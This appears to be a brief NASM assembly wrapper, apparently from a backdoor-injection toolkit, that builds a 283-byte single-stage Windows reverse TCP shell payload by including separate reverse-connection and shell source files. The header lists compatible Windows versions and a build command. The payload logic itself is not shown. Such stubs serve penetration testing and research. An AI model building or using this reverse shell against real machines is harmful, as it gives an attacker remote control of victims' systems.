;-----------------------------------------------------------------------------;
; Author: Joshua Pitts @midnite_runr
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Version: 1.0 (28 July 2009)
; Size: 283 bytes
; Build: >build.py loadliba_single_shell_reverse_tcp
; Does not include code from BDF python intel/Winintel32.py for ASLR bypass and 
; LoadLibraryA and GetProcAddress api call assignment.
;-----------------------------------------------------------------------------;
[BITS 32]
[ORG 0]

  
%include "./src/loadliba_reverse_tcp.asm"

%include "./src/loadliba_shell.asm"
